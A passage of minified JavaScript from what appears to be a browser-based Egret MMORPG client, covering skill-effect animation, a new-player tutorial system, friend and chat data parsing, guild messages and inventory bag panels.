k={x:i.target[0].x,y:i.target[0].y,handle:(null===(p=null===(t=i.source)||void 0===t?void 0:t.infoModel)||void 0===p?void 0:p.handle)||0};n.lockXY.push(k)}if(c.lock){if(i.fubenID!=l.GameMap.fubenID)return void(i&&(null===i||void 0===i?void 0:i.mc)&&r.DisplayUtils.removeFromParent(i.mc));if((null===(g=null===(f=u.EntityManager.ins().getEntityByHandle(null===(d=n.lockXY[0])||void 0===d?void 0:d.handle))||void 0===f?void 0:f.infoModel)||void 0===g?void 0:g.hp)<=0||!u.EntityManager.ins().getEntityByHandle(null===(m=n.lockXY[0])||void 0===m?void 0:m.handle))return i&&(null===i||void 0===i?void 0:i.mc)&&r.DisplayUtils.removeFromParent(i.mc),void(n.lockXY.length>0&&n.lockXY.splice(0,1));var B=new h.Entity;B.x=n.lockXY[0].x,B.y=n.lockXY[0].y,i.target[0]=B,n.lockXY.length>0&&n.lockXY.splice(0,1)}i.mc=y;var P=n["layer"+S];P&&P.call(n,i);var R=n["type"+c.type];if(R&&R.call(n,i,c),c.tween.length>0)for(var E=egret.Tween.get(y),G=0;G<c.tween.length;G+=2){var M=c.tween[G];E.to(M,c.tween[G+1].time)}},d)},d=this,c=0;c<t.length;c++)p(c)},e.play=function(t,e,i,n,o,s,a,r){var l=this;void 0===i&&(i=[]),void 0===n&&(n=null),void 0===o&&(o=1),void 0===s&&(s=null),void 0===a&&(a=""),void 0===r&&(r=0);var h=""+this.urlRoot+this.urlSkill+t+".json";RES.getResByUrl(h,function(h){if(!h)return void console.log("没有这个技能 -- "+t);var u=new c;u.initParam={dir:e.dir,x:e.x,y:e.y,tar:[]};for(var p=0;i&&p<i.length;p++)u.initParam.tar.push({dir:i[p].dir,x:i[p].x,y:i[p].y});u.source=e,u.target=i,u.hitFun=n,u.rate=o,u.offset=s,u.append=a,0!=r?u.isBall=r:u.isBall=0,l.playConfigs(h,u)},this,RES.ResourceItem.TYPE_JSON)},e.type1=function(t,e){var i=this,n=t.target,o=t.source,s=t.mc,l=t.hitFun,h=e.isInit?{x:t.initParam.tar[0].x,y:t.initParam.tar[0].y}:n[0],u=e.dis||a.MathUtils.getDistanceByObject(o,h);e.sDis&&(u+=e.sDis);var p=a.MathUtils.getAngle(a.MathUtils.getRadian2(o.x,o.y,h.x,h.y))+e.range;if(e.sDis){var d=a.MathUtils.getDirMove(p,e.sDis);s.x+=d.x,s.y+=d.y}var c=a.MathUtils.getDirMove(p,u,s.x,s.y);e.lock&&(c.x=h.x,c.y=h.y);var f;0!=t.isBall?(s.P0.x=s.x,s.P0.y=s.y,s.P2.x=c.x,s.P2.y=c.y,s.setOfTwoPos(t.isBall),f=egret.Tween.get(s,{loop:!1,onChange:s.mathAngle,onChangeObj:s}),f.to({factor:1},u/e.moveSpeed*1e3).call(function(){r.DisplayUtils.removeFromParent(s),e.hit&&l&&l(e.probability),e.exEff&&i.play(e.exEff,o,n,l,1,null,t.append)})):(f=egret.Tween.get(s),f.to({x:c.x,y:c.y},u/e.moveSpeed*1e3).call(function(){r.DisplayUtils.removeFromParent(s),e.hit&&l&&l(e.probability),e.exEff&&i.play(e.exEff,o,n,l,1,null,t.append)}))},e.type96=function(t,e){if(!this.shake)return void console.warn("SkillEffPlayer.shake未设置");var i=t.source;this.shake(i,e.range,e.time,e.playCount,e.probability)},e.type99=function(t,e){var i=t.hitFun;i&&i(e.probability)},e.type100=function(t,e){var i=this,n=t.target,o=t.source,s=t.mc,l=t.hitFun,h=e.isInit?{x:t.initParam.tar[0].x,y:t.initParam.tar[0].y}:n[0],u=e.dis||a.MathUtils.getDistanceByObject(o,h)*e.flyspeed,p=a.MathUtils.getAngle(a.MathUtils.getRadian2(o.x,o.y,h.x,h.y))+e.range;if(e.sDis){var d=a.MathUtils.getDirMove(p,e.sDis);s.x+=d.x,s.y+=d.y}var c,f=a.MathUtils.getDirMove(p,u,s.x,s.y);c=egret.Tween.get(s),c.to({x:f.x,y:f.y},u/e.moveSpeed*(e.delay*e.flyspeed||1e3)).call(function(){r.DisplayUtils.removeFromParent(s),e.hit&&l&&l(e.probability),e.exEff&&i.play(e.exEff,o,n,l,1,null,t.append)})},e.layer0=function(t){var e=t.source,i=t.mc;return i.x+=e.x,i.y+=e.y,this.bottomLayer?void this.bottomLayer.addChild(i):void console.warn("SkillEffPlayer.bottomLayer未设置")},e.layer1=function(t){var e=t.source,i=t.mc;e.addChildAt(i,0)},e.layer2=function(t){var e=t.source,i=t.mc;e.addChild(i)},e.layer3=function(t){var e=t.source,i=t.mc;return i.x+=e.x,i.y+=e.y,e.entityOffX()&&(i.x+=e.entityOffX()),e.entityOffY()&&(i.y+=e.entityOffY()),this.topLayer?void this.topLayer.addChild(i):void console.warn("SkillEffPlayer.topLayer未设置")},e.layer4=function(t){var e=t.target,i=t.mc;return i.x+=e[0].x,i.y+=e[0].y,e[0].entityOffX()&&(i.x+=e[0].entityOffX()),e[0].entityOffY()&&(i.y+=e[0].entityOffY()),this.bottomLayer?void this.bottomLayer.addChild(i):void console.warn("SkillEffPlayer.bottomLayer未设置")},e.layer5=function(t){var e=t.target,i=t.mc;e[0].addChildAt(i,0)},e.layer6=function(t){var e=t.target,i=t.mc;e[0].addChild(i)},e.layer7=function(t){var e,i=t.target,n=t.mc;return t&&i&&!(null===(e=i[0])||void 0===e?void 0:e.x)?void(t&&(null===t||void 0===t?void 0:t.mc)&&r.DisplayUtils.removeFromParent(t.mc)):(n.x+=i[0].x,n.y+=i[0].y,i[0].entityOffX()&&(n.x+=i[0].entityOffX()),i[0].entityOffY()&&(n.y+=i[0].entityOffY()),this.topLayer?void this.topLayer.addChild(n):void console.warn("SkillEffPlayer.topLayer未设置"))},e.layer8=function(t){return this.fixedLayer?void this.fixedLayer.addChild(t.mc):void console.warn("SkillEffPlayer.topLayer未设置")},e.layer100=function(t){var e=t.source,i=t.mc;return i.x+=e.x,i.y+=e.y,this.topLayer?void this.topLayer.addChild(i):void console.warn("SkillEffPlayer.bottomLayer未设置")},e.disposeChainMc=function(t,e,i){for(var n=0;n<this.chainInfoList.length;n++){var o=this.chainInfoList[n];if(o&&o.effId==t&&o.srcEntityId==e&&o.tarEntityId==i){o.chainMc&&r.DisplayUtils.removeFromParent(o.chainMc),this.chainInfoList.splice(n,1);break}}0==this.chainInfoList.length&&0==this.warSoulInfoList.length&&this.topLayer.removeEventListener(egret.Event.ENTER_FRAME,this.enterFrame,this)},e.createChainEff=function(t,e,i,n){if(this.disposeChainMc(t,i,n),e){var o=u.EntityManager.ins().getEntityByHandle(i);if(o){var s=u.EntityManager.ins().getEntityByHandle(n);if(s){var a=ObjectPool.pop("MovieClip");a.playFile(RES_DIR_EFF+"zhuzai_hx",-1),this.topLayer.addChild(a),this.chainInfoList.push({effId:t,chainMc:a,srcEntityId:i,tarEntityId:n}),this.topLayer.removeEventListener(egret.Event.ENTER_FRAME,this.enterFrame,this),this.topLayer.addEventListener(egret.Event.ENTER_FRAME,this.enterFrame,this)}}}},e.enterFrame=function(){for(var t=p.GameServerCC.serverTime,e=0,i=this.chainInfoList;e<i.length;e++){var n=i[e];if(n){var o=u.EntityManager.ins().getEntityByHandle(n.srcEntityId),s=u.EntityManager.ins().getEntityByHandle(n.tarEntityId);o&&s?this.updateChainMc(n.chainMc,o,s):this.disposeChainMc(n.effId,n.srcEntityId,n.tarEntityId)}}for(var a=0,r=this.warSoulInfoList;a<r.length;a++){var n=r[a];if(n){var o=u.EntityManager.ins().getEntityByHandle(n.srcEntityId);!o||t-n.time>3e3?this.disposeWarSoulMc(n.effId,n.srcEntityId):this.updateWarSoulMc(n.effMc,o)}}},e.updateChainMc=function(t,e,i){if(t&&e&&i){var n=(e.x+e.entityOffX()+i.x+i.entityOffX())/2,o=(e.y+e.entityOffY()+i.y+i.entityOffY())/2;t.x=n,t.y=o;var s=i.x+i.entityOffX()-e.x-e.entityOffX(),a=i.y+i.entityOffY()-e.y-e.entityOffY(),r=Math.sqrt(s*s+a*a);t.scaleY=t.height?r/t.height:1;var l=180*Math.atan2(a,s)/Math.PI;t.rotation=l+90}},e.playWarSoulAtk=function(t,e,i,n,a,l,h){if(void 0===n&&(n=100),void 0===a&&(a=!0),void 0===l&&(l=300),void 0===h&&(h=300),e&&e.data){this.disposeWarSoulMc(t,e.data.handle);var u=i?s.DirUtil.get8DirBy2Point(e,i):0;u=s.DirUtil.get4DirBy8Dir(u);var d=new o.MovieClip;this.topLayer.addChild(d),d.x=e.x,d.y=e.y,e.entityOffX()&&(d.x+=e.entityOffX()),e.entityOffY()&&(d.y+=e.entityOffY()),d.scaleX=(u>4?-1:1)*n/100,6==u&&(u=2),d.scaleY=n/100;var c=t+"_4h";d.playFile(RES_DIR_MONSTER+c,-1,null,!1),d.alpha=0,this.warSoulInfoList.push({effId:t,effMc:d,srcEntityId:e.data.handle,time:p.GameServerCC.serverTime}),egret.Tween.get(d).to({alpha:.8},l).call(function(){var e=a?t+"_"+u+"a":t+"_4s";d.playFile(RES_DIR_MONSTER+e,1,function(){egret.Tween.get(d).to({alpha:0},h).call(function(){r.DisplayUtils.removeFromParent(d)})},!1)}),this.topLayer.removeEventListener(egret.Event.ENTER_FRAME,this.enterFrame,this),this.topLayer.addEventListener(egret.Event.ENTER_FRAME,this.enterFrame,this)}},e.disposeWarSoulMc=function(t,e){for(var i=0;i<this.warSoulInfoList.length;i++){var n=this.warSoulInfoList[i];if(n&&n.effId==t&&n.srcEntityId==e){n.effMc&&r.DisplayUtils.removeFromParent(n.effMc),this.warSoulInfoList.splice(i,1);break}}0==this.chainInfoList.length&&0==this.warSoulInfoList.length&&this.topLayer.removeEventListener(egret.Event.ENTER_FRAME,this.enterFrame,this)},e.updateWarSoulMc=function(t,e){t&&e&&(t.x=e.x,t.y=e.y,e.entityOffX()&&(t.x+=e.entityOffX()),e.entityOffY()&&(t.y+=e.entityOffY()))},e.atkEffEnterFrame=function(){},e.urlRoot="",e.lockXY=[],e.chainInfoList=[],e.warSoulInfoList=[],e}(n.BaseClass);e.SkillEffPlayer=d,window.SkillEffPlayer=d,__reflect(d.prototype,"SkillEffPlayer",[]);var c=function(){function t(){this.append="",this.rate=1}return t}();e.EffParam=c,window.EffParam=c,__reflect(c.prototype,"EffParam",[]);var f=function(){function t(){this.type=0,this.delay=0,this.layer=3,this.x=0,this.y=0,this.effectId=0,this.playSpeed=1,this.scaleX=1,this.scaleY=1,this.rotation=0,this.isDir=0,this.moveSpeed=100,this.playCount=1,this.dis=0,this.sDis=0,this.alpha=1,this.isRot=0,this.hit=0,this.cx=0,this.cy=0,this.range=0,this.time=0,this.isRate=0,this.isInit=0,this.probability=1,this.exEff="",this.tolock=0,this.lock=0,this.flyspeed=1,this.dirPos=[],this.tween=[]}return t.initValue=function(t){return t.__proto__=this.o,t},t.o=new t,t}();e.SkillEffConfig=f,window.SkillEffConfig=f,__reflect(f.prototype,"SkillEffConfig",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuideUtils=void 0;var n=i(0),o=i(85),s=i(35),a=i(50),r=i(16),l=i(103),h=i(701),u=function(t){function e(){var e=t.call(this)||this;return e.step=0,e.part=0,e.wrongCount=0,e.maxWrongCount=2,e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.init=function(){if(!this.isInit){this.isInit=!0,0==o.Setting.currPart?(this.part=1,this.step=1):(this.part=o.Setting.currPart,this.step=o.Setting.currStep),this.cfg=[];var t;for(var e in n.GlobalConfig.GuideConfig){t=[];for(var i in n.GlobalConfig.GuideConfig[e])t.push(n.GlobalConfig.GuideConfig[e][i]);this.cfg.push(t)}if(this.part<=this.cfg.length){var a=this.cfg[this.part-1].length-1;this.overs=this.cfg[this.part-1][a].overs}this.part<=this.cfg.length&&observe(this,this.updateByTask,s.TaskCT.ins().postUpdteTaskTrace)}},e.prototype.updateByTask=function(){this.guideOver(),this.update(1)},e.prototype.updateByClick=function(){this.update(2)},e.prototype.updateByAppear=function(){this.update(3)},e.prototype.canShow=function(){return urlParam.noGuide?!1:this.part>this.cfg.length?(delMsg(this),!1):this.view&&this.view.parent?!1:!0},e.prototype.checkShow=function(){if(!this.curCfg)return!1;try{var t=this.getDisplayObj(this.part,this.step);if(!t)return!1}catch(e){return!1}return!0},e.prototype.addTimeHandler=function(){Timer.has(this.timeHandler,this)||Timer.start(50,0,this.timeHandler,this)},e.prototype.removeTimeHandler=function(){Timer.stop(this.timeHandler,this)},e.prototype.timeHandler=function(){this.canShow()?this.checkShow()&&this.show(this.part,this.step):this.removeTimeHandler()},e.prototype.guideOver=function(){var t=s.TaskCT.ins().taskTrace;if(this.overs&&t&&0==t.state)for(var e=this.overs.length,i=0;e>i;i++){var n=this.overs[i];if(1==n.type&&n.value==t.id)return this.readyForNext(),void this.close()}},e.prototype.update=function(t){if(void 0===t&&(t=0),0!=this.canShow()&&(this.curCfg=this.cfg[this.part-1][this.step-1],this.curCfg&&this.curCfg.start))if(1==t){if(1==this.curCfg.start.type){var i=s.TaskCT.ins().taskTrace;i.id==this.curCfg.start.value&&0==i.state&&e.ins().show(this.part,this.step)}else if(3==this.curCfg.start.type){var i=s.TaskCT.ins().taskTrace;i.id==this.curCfg.start.value&&1==i.state&&e.ins().show(this.part,this.step)}}else if(2==t){if(2==this.curCfg.start.type){var i=s.TaskCT.ins().taskTrace;i.id==this.curCfg.start.value&&0==i.state&&e.ins().show(this.part,this.step)}}else 3==t&&4==this.curCfg.start.type&&e.ins().show(this.part,this.step)},e.prototype.show=function(t,e){var i=this;this.part=t,this.step=e;var n=this.cfg[this.part-1];if(n?this.curCfg=this.cfg[this.part-1][this.step-1]:this.curCfg=null,!this.curCfg)return this.readyForNext(),void this.close();if(!this.checkShow())return this.close(),void this.addTimeHandler();null==this.view&&(this.view=new h.GuideView),this.view.clickCD=!0,this.view.hasEventListener(egret.Event.CHANGE)||this.view.addEventListener(egret.Event.CHANGE,this.next,this),this.save();var o;try{o=this.getDisplayObj(t,e)}catch(s){return this.wrongCount>=this.maxWrongCount?void this.close():(this.wrongCount++,this.view.removeDisplay(),console.log("新手引导:"+t+","+e+"出错,重新播放"),void Timer.start(300,1,function(){i.show(t,e-1)},this))}o?(console.log("播放新手引导:"+t+","+e),egret.callLater(function(){i.view.show(o,1==i.curCfg.mask),l.StageUtils.ins().getStage().addChild(i.view)},this)):(this.readyForNext(),this.close())},e.prototype.clickOut=function(){this.curCfg&&1==this.curCfg.type&&(this.readyForNext(),this.close())},e.prototype.readyForNext=function(){if(this.part++,this.step=1,this.part<=this.cfg.length){var t=this.cfg[this.part-1].length-1;this.overs=this.cfg[this.part-1][t].overs}else this.overs=null;this.curCfg=null},e.prototype.close=function(){this.view&&(r.DisplayUtils.removeFromParent(this.view),this.wrongCount=0),this.removeTimeHandler()},e.prototype.next=function(){var t=this;egret.callLater(function(){t.show(t.part,t.step+1)},this)},e.prototype.save=function(){1==this.step&&(o.Setting.ins().setValue(o.ClientSet.guidePart,this.part+1),o.Setting.ins().setValue(o.ClientSet.guideStep,1))},e.prototype.getDisplayObj=function(t,e){var i,n;if(this.cfg[t-1]&&e<=this.cfg[t-1].length){n=this.cfg[t-1][e-1];var o=egret.getDefinitionByName(n.view);o||console.warn(n.view);for(var s=win.get(o),a=n.target.split("."),r=0,l=a;r<l.length;r++){var h=l[r];if(~h.indexOf("(")){var u=h.replace("()","");s=s[u]()}else s=s[h]}i=s}return i},e}(a.BaseClass);e.GuideUtils=u,window.GuideUtils=u,__reflect(u.prototype,"GuideUtils",[]),Systemap.GuideUtils=function(){return u.ins()},window.GuideUtils=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.JobConst=void 0;var n;!function(t){t[t.None=0]="None",t[t.ZhanShi=1]="ZhanShi",t[t.FaShi=2]="FaShi",t[t.DaoShi=3]="DaoShi",t[t.CiKe=4]="CiKe",t[t.GongShou=5]="GongShou"}(n=e.JobConst||(e.JobConst={})),window.JobConst=n,window.JobConst=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ChatData=e.FriendData=void 0;var n=i(93),o=i(8),s=i(42),a=function(){function t(t,e){if(void 0===e&&(e=null),this.serverName=0,this._offLineSec=0,this.appDate=0,this._redPoint=!1,this.msgMaxLen=50,this.lastMsg="",this.lastMsgDate=0,this.lastMsgData_local=0,this.type=t,e){switch(this.id=e.readInt(),this.name=e.readString(),this.guildName=e.readString(),this.online=e.readUnsignedByte(),this.job=e.readUnsignedByte(),this.sex=e.readUnsignedByte(),this.vip=e.readUnsignedByte(),this.lv=e.readUnsignedByte(),this.zs=e.readUnsignedByte(),this.monthCard=e.readUnsignedByte(),this.ladderLv=e.readUnsignedByte(),this.isLastWeekLadder=e.readUnsignedByte(),this.power=e.readInt(),this.serverName=e.readUnsignedShort(),t){case 1:var i=e.readInt()||0;this.offLineSec=i;break;case 2:this.lastMsgDate=e.readInt();break;case 3:var n=e.readInt()||0;this.appDate=n;break;case 4:}this.openId=e.readString(),this.appId=e.readString()}}return Object.defineProperty(t.prototype,"offLineSec",{get:function(){var t=0;try{var e=Date.now()/1e3;t=Math.floor(this._offLineSec+(e-this._updateTs))}catch(i){console.log(i)}return t},set:function(t){this._offLineSec=t,this._updateTs=Date.now()/1e3},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"redPoint",{get:function(){var t=this._redPoint;return this._redPoint=!1,t},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"acMsg",{get:function(){return null==n.Friends.ins().chatList[this.id]&&(n.Friends.ins().chatList[this.id]=new eui.ArrayCollection),n.Friends.ins().chatList[this.id]},set:function(t){n.Friends.ins().chatList[this.id]=t},enumerable:!1,configurable:!0}),t.prototype.addChat=function(t){var e=this;if(this._redPoint=t.fromActor.id==this.id,0==this.acMsg.length)t.showDate=!0;else for(var i=e.acMsg.length-1;i>=0;--i){var n=e.acMsg.getItemAt(i);if(t.date-n.date>300&&(t.showDate=!0),n.showDate)break}e.acMsg.addItem(t),e.lastMsgData_local=Date.now(),e.acMsg.length>this.msgMaxLen&&e.acMsg.removeItemAt(0)},t}();e.FriendData=a,window.FriendData=a,__reflect(a.prototype,"FriendData",[]);var r=function(){function t(t,e,i,n){this.date=0,this.msg="",this.showDate=!1,this.fromActor=t,this.toActor=e,this.date=i,this.msg=n}return Object.defineProperty(t.prototype,"dateStr",{get:function(){var t=o.DateUtils.getFormatBySecond(o.DateUtils.formatMiniDateTime(this.date)/1e3,8);return t=s.StringUtils.complementByChar(t,16)},enumerable:!1,configurable:!0}),t}();e.ChatData=r,window.ChatData=r,__reflect(r.prototype,"ChatData",[]),window.FriendData=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildMessageInfo=void 0;var n=i(58),o=i(213),s=function(){function t(){this.pfVipInfo={}}return t.prototype.parserMessage=function(t){if(this.type=t.readUnsignedByte(),this.content=t.readString(),3==this.type){var e=this.content.split("-"),i=e[0];if(e.length>1){var s=e[1];this.content=n.LangUtils.analysis(i,s)}else this.content=n.LangUtils.analysis(i,"")}this.cd=0,1==this.type&&(this.roleId=t.readInt(),this.name=t.readString(),this.job=t.readUnsignedByte(),this.sex=t.readUnsignedByte(),this.vipLevel=t.readInt(),this.monthCard=t.readUnsignedByte(),this.office=t.readUnsignedByte(),this.times=t.readInt(),this.zsLevel=t.readUnsignedByte(),this.lv=t.readShort(),this.guildName=t.readString(),this.pfVipInfo=o.PFVipCT.parserPFVipInfo(t))},t}();e.GuildMessageInfo=s,window.GuildMessageInfo=s,__reflect(s.prototype,"GuildMessageInfo",[]),window.GuildMessageInfo=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildSoulsRedPoint=void 0;var n=i(14),o=i(0),s=i(94),a=function(t){function e(){var e=t.call(this)||this;return observe(e,e.postRedPoint,s.GuildSoulsLandCT.ins().postupdatePass,s.GuildSoulsLandCT.ins().postRewardInfo,s.GuildSoulsLandCT.ins().postSweep,s.GuildSoulsLandCT.ins().postInit),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.postRedPoint=function(){var t=s.GuildSoulsLandCT.ins();return t.open&&t.isOpen()?void(this.redPoint=this.checkChallengeRed()||this.checkRewardRed()):void(this.redPoint=!1)},e.prototype.checkChallengeRed=function(){var t=s.GuildSoulsLandCT.ins();return t.open&&t.isOpen()&&t.challenge>=s.GuildSoulsLandCT.MAX_CHALLENGE&&!t.isAllPass()?!0:!1},e.prototype.checkRewardRed=function(){var t=s.GuildSoulsLandCT.ins();if(!t.open||!t.isOpen())return!1;var e=o.GlobalConfig.GuildAllSoulLandBossInfoConfig;
for(var i in e)if(s.GuildSoulsLandCT.ins().checkCanGetReward(Number(i)))return!0;return!1},__decorate([post()],e.prototype,"postRedPoint",null),e}(n.BaseSystem);e.GuildSoulsRedPoint=a,window.GuildSoulsRedPoint=a,__reflect(a.prototype,"GuildSoulsRedPoint",[]),Systemap.GuildSoulsRedPoint=function(){return a.ins()},window.GuildSoulsRedPoint=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BagPanel=void 0;var n=i(1),o=i(11),s=i(0),a=i(38),r=i(123),l=i(2),h=i(6),u=i(10),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="bagPanelSkin",e.oldIndex=-1,e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){this.baseTab=this.eTab,this.eList.itemRenderer=o.ItemBase,this.sData=new eui.ArrayCollection,this.eList.dataProvider=this.sData,observe(this,this.updateBag,h.BagCT.ins().postItemChange),observe(this,this.setCount,h.BagCT.ins().postBagVolAdd),observe(this,this.updateBag,h.BagCT.ins().postItemAdd),observe(this,this.updateBag,h.BagCT.ins().postItemDel),observe(this,this.updateBag,a.EquipCT.ins().sendEquipLock),observe(this,this.updateBag,h.BagCT.ins().postItemCoolDown),h.BagCT.ins().sendBagCellAdd(1),this.addTouchEvent(this.eAddBtn,this.onClick),this.addChangeEvent(this.eTab,this.onTabTouch),this.setBagData(0),this.eTab.selectedIndex=0,this.eAddBtn.visible=!window.platform.isshen(),a.EquipCT.ins().sendEquipXiLianNum()},e.prototype.removeDisplay=function(){if(this.skin){if(this.removeObserve(),this.removeTouchEvent(this.eAddBtn,this.onClick),this.eTab&&this.removeTouchEvent(this.eTab,this.onTabTouch),this.eList&&this.eList.numChildren>0)for(var t=this.eList.numChildren-1;t>=0;t--){var e=this.eList.getChildAt(t);e&&e.clearAll()}this.sData&&this.sData.replaceAll(null),this.eList&&(this.eList.dataProvider=null)}},e.prototype.updateBag=function(){this.setBagData(this.oldIndex)},e.prototype.setCount=function(){this.eItemCount.text=h.BagCT.ins().getBagItemNum(1)+h.BagCT.ins().getBagItemNum(0)+"/"+h.BagCT.ins().getMaxBagRoom()},e.prototype.setBagData=function(t){void 0===t&&(t=1);var e=[],i=[],n=[],o=[];switch(t){case 0:e=h.BagCT.ins().getBagGoodsBySort(0),i=h.BagCT.ins().getBagGoodsBySort(2),n=h.BagCT.ins().getBagGoodsBySort(3),o=h.BagCT.ins().getBagSortQualityEquips(5,0,1),o.sort(h.BagCT.ins().sort3);break;case 1:e=h.BagCT.ins().getBagGoodsBySort(0),i=h.BagCT.ins().getBagGoodsBySort(2),n=h.BagCT.ins().getBagGoodsBySort(3);break;case 2:o=h.BagCT.ins().getBagSortQualityEquips(5,0,1),o.sort(h.BagCT.ins().sort3)}e.sort(this._sort),i.sort(this._sort),o.sort(this._sort);var s=n.concat(i,e,o);if(this.eList&&this.eList.numChildren>0)for(var a=this.eList.numChildren-1;a>=0;a--){var r=this.eList.getChildAt(a);r&&(r.isShowRed=!0)}this.sData.replaceAll(s),this.oldIndex!=t&&(this.oldIndex=t),this.setCount()},e.prototype._sort=function(t,e){var i=s.GlobalConfig.EquipConfig[t.configID],n=s.GlobalConfig.EquipConfig[e.configID];if(!i||!n)return 0;if(t.quality!=e.quality)return e.quality-t.quality;if(t.itemConfig&&e.itemConfig){var o=u.ItemUtil.getSubType(t.itemConfig),a=u.ItemUtil.getSubType(e.itemConfig);if(o!=a)return a-o;if(t.itemConfig.level!=e.itemConfig.level)return e.itemConfig.level-t.itemConfig.level}var r=(i&&i.exPower||0)+t.point,l=(n&&n.exPower||0)+e.point;return r!=l?l-r:e.job-t.job},e.prototype.onClick=function(t){switch(t.target){case this.eAddBtn:h.BagCT.ins().goldLastTime||h.BagCT.ins().payLastTime||h.BagCT.ins().adLastTime?win.open("BagAddCellWin")&&win.open("StoreHouseWin"):l.TipsCT.ins().showTips(gettext("背包扩容已上限"))}},e.prototype.onTabTouch=function(){this.oldIndex!=this.eTab.selectedIndex&&(this.setBagData(this.eTab.selectedIndex),this.eTab.selectedIndex=this.eTab.selectedIndex,this.eList.scrollV=0)},e.prototype.tabRp=function(){return a.EquipCT.ins().tjRp.v||h.BagCT.ins().bagTjRed.v||h.BagCT.ins().XinShouLiBao.v||h.BagCT.ins().redWearBag()||r.ShenFuCT.ins().upRed.v||h.BagCT.ins().callbackRed.v},e.prototype.clearPanel=function(){},e.prototype.GuideClothes=function(){var t,e,i;if(this.eList&&(null===(t=this.eList)||void 0===t?void 0:t.numElements)){for(var n=0;n<this.eList.numElements;n++){var o=this.eList.getElementAt(n);if(!o)return null;var a=s.GlobalConfig.ItemDescConfig[(null===(i=null===(e=o.data)||void 0===e?void 0:e.itemConfig)||void 0===i?void 0:i.descIndex)||0];if(2==(null===a||void 0===a?void 0:a.subType)&&0==(null===a||void 0===a?void 0:a.type))return o}return null}},e.prototype.GuideWeapon=function(){var t,e,i;if(this.eList&&(null===(t=this.eList)||void 0===t?void 0:t.numElements)){for(var n=0;n<this.eList.numElements;n++){var o=this.eList.getElementAt(n);if(!o)return null;var a=s.GlobalConfig.ItemDescConfig[(null===(i=null===(e=o.data)||void 0===e?void 0:e.itemConfig)||void 0===i?void 0:i.descIndex)||0];if(0==(null===a||void 0===a?void 0:a.subType)&&0==(null===a||void 0===a?void 0:a.type))return o}return null}},__decorate([delayCall(100)],e.prototype,"updateBag",null),e}(n.BaseView);e.BagPanel=p,window.BagPanel=p,__reflect(p.prototype,"BagPanel",[]),window.BagPanel=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BagWin=void 0;var n=i(16),o=i(1),s=i(17),a=i(15),r=i(4),l=i(296),h=i(308),u=i(309),p=i(12),d=i(38),c=i(123),f=i(310),g=i(35),m=i(314),v=i(27),y=i(684),C=i(6),T=i(224),b=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.oneLevelWin=!0,e._sn_="bagWinSkin",e.panelArr=[],e}return __extends(e,t),Object.defineProperty(e,"panelNames",{get:function(){return[T.BagWin2,l.BookPanel,m.TitlePanel,f.RunePanel,u.HeirloomPanel,h.ExtremeEquipPanel,y.WushuangEquipPanel]},enumerable:!1,configurable:!0}),e.prototype.skinComplete=function(){if(this.baseWin.closeObj=this,this.baseWin.closeFun=this.closeFun,!this.panelArr||!this.panelArr.length){this.panelArr=[];for(var t=0;t<this.eVs.numChildren;t++){var e=this.eVs.getChildAt(t),i=egret.getQualifiedClassName(e);this.panelArr[t]=i}}},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.param=t,this.baseTab=this.eTab,this.baseViewStack=this.eVs,this.eTab.addEventListener(eui.UIEvent.CHANGING,this.CHANGING,this),this.initTab(),this.open(),observe(this,this.redRefresh,s.RedPointBaseSys.ins().RpChange),observe(this,this.updateTabRed,C.BagCT.ins().postItemChange),observe(this,this.updateTabRed,C.BagCT.ins().postBagVolAdd),observe(this,this.updateTabRed,C.BagCT.ins().postItemAdd),observe(this,this.updateTabRed,C.BagCT.ins().postItemDel),observe(this,this.updateTabRed,d.EquipCT.ins().sendEquipLock),observe(this,this.updateTabRed,C.BagCT.ins().postItemCoolDown),observe(this,this.updateTabRed,r.ActorCC.postPowerChange),observe(this,this.updateTabRed,r.ActorCC.postGoldChange),observe(this,this.updateTabRed,r.ActorCC.postExp),observe(this,this.updateTabRed,C.BagCT.ins().postItemAdd),g.TaskCT.ins().sendTitleTask()},e.prototype.initTab=function(){if(this.skin)for(var t=this.eVs.numChildren-1;t>=0;t--){var e=this.eVs.getChildAt(t),i=egret.getQualifiedClassName(e);win.showCheck(egret.getDefinitionByName(i))||this.eVs.removeChildAt(t)}},e.prototype.removeDisplay=function(){if(this.skin){if(this.removeObserve(),this.eVs&&this.eVs.numElements>0)for(var t=this.eVs.numElements-1;t>=0;t--){var e=this.eVs.getElementAt(t);e&&(e.clearPanel&&e.clearPanel(),n.DisplayUtils.removeFromParent(e))}n.DisplayUtils.removeFromParent(this.eVs),n.DisplayUtils.removeFromParent(this.eTab)}},e.prototype.redRefresh=function(){this.bagTab0=this.eTab.getElementAt(0),this.bagTab0&&(this.bagTab0.eRp.visible=C.BagCT.ins().XinShouLiBao.v||C.BagCT.ins().redWearBag()||c.ShenFuCT.ins().upRed.v||C.BagCT.ins().callbackRed.v||d.EquipCT.ins().tjRp.v||C.BagCT.ins().bagTjRed.v,C.BagCT.ins().bagTjRed.v=this.bagTab0.eRp.visible)},e.prototype.updateTabRed=function(){this.eTab.updateReds()},e.prototype.open=function(){var t=this.param[0]||0,e=this.panelArr[t]||egret.getQualifiedClassName(this.eVs.getChildAt(t));if(win.openCheck(egret.getDefinitionByName(e))){t=0;for(var i=0;i<this.eVs.numChildren;i++){var n=this.eVs.getChildAt(i),o=egret.getQualifiedClassName(n);if(o==e){t=i;break}}}else t=0;var s=this.eVs.getElementAt(t),r=egret.getQualifiedClassName(s);if("BagWin2"==r){var 